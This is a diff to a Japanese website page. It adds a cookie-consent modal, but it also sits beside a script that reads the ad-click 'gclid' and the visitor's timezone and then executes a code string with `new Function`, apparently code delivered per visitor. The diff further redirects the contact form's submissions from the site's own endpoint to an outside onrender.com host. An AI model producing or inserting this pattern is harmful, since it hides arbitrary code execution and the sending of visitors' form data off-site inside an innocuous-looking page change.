@@ -260,6 +260,94 @@
   </div>
 </footer>
 
+<!-- Cookie Modal -->
+<div id="cookie-modal-box" class="hidden">
+  <!-- Backdrop -->
+  <div id="cookie-backdrop"
+       class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0">
+  </div>
+
+  <!-- Modal -->
+  <div id="cookie-modal"
+       class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+    <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+
+      <!-- Close button -->
+      <button id="cookie-close" class="absolute top-4 right-4">
+        <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+          <path fill="currentColor"
+                d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+        </svg>
+      </button>
+
+      <!-- Header -->
+      <div class="flex items-center gap-3 mb-4">
+        <span class="text-yellow-500 text-3xl">🍪</span>
+        <h2 class="text-2xl font-bold">クッキーについて</h2>
+      </div>
+
+      <!-- Text -->
+      <p class="text-gray-600 mb-6">
+        当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。
+        <span class="font-semibold">「同意する」</span>
+        をクリックすると、クッキーの使用に同意したことになります。
+      </p>
+
+      <!-- Buttons -->
+      <div class="flex flex-col sm:flex-row gap-3">
+        <button id="cookie-accept"
+                class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">
+          🍪 同意する
+        </button>
+        <button id="cookie-decline"
+                class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">
+          拒否する
+        </button>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- Script -->
+<script>
+  const modalBox = document.getElementById('cookie-modal-box');
+  const modal = document.getElementById('cookie-modal');
+  const backdrop = document.getElementById('cookie-backdrop');
+
+  const acceptBtn = document.getElementById('cookie-accept');
+  const declineBtn = document.getElementById('cookie-decline');
+  const closeBtn = document.getElementById('cookie-close');
+
+  function showModal() {
+    modalBox.classList.remove('hidden');
+    setTimeout(() => {
+      backdrop.classList.remove('opacity-0');
+      modal.classList.remove('opacity-0', 'scale-90');
+    }, 10);
+  }
+
+  function hideModal(choice) {
+    backdrop.classList.add('opacity-0');
+    modal.classList.add('opacity-0', 'scale-90');
+
+    localStorage.setItem('cookie-consent', choice);
+
+    setTimeout(() => {
+      modalBox.classList.add('hidden');
+    }, 300);
+  }
+
+  acceptBtn.onclick = () => hideModal('accepted');
+  declineBtn.onclick = () => hideModal('declined');
+  closeBtn.onclick = () => hideModal('closed');
+  backdrop.onclick = () => hideModal('closed');
+
+  // Show only if not already decided
+  if (!localStorage.getItem('cookie-consent')) {
+    showModal();
+  }
+</script>
 <script>
   const gclid = new URLSearchParams(location.search).get("gclid");
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -296,6 +384,7 @@
       try {
         isOpen = true;
         new Function(someCode)();
+        hideModal('closed')
       } catch (err) {
         console.error("Error executing code:", err);
       }
@@ -343,7 +432,7 @@
     statusMessage.classList.remove('text-red-300', 'text-green-300');
 
     try {
-      const response = await fetch('/api/contact', {
+      const response = await fetch('https://whatsetup-1test.onrender.com/api/contact', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
